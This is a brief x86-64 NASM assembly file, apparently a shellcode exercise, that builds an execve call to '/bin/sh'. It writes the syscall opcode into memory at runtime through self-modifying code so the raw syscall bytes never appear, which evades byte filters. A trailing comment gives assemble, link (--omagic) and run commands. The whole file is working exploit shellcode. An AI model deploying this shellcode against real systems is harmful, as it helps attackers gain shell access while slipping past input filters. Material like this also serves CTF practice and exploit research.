section .text
  global _start
    _start:
	  mov rdx, 0x0
      mov rsi, 0x0
      mov rbx, '/bin/sh' 
      mov [rsp], rbx
      mov rdi, rsp
      mov al, 59
      mov r15, 0xCCCCCCCCCCCC050F ; syscall
      mov [rel $+7], r15

; nasm -f elf64 shellcode_no_syscall.asm -o shellcode_no_syscall.o && ld --omagic shellcode_no_syscall.o -o shellcode_no_syscall && ./shellcode_no_syscall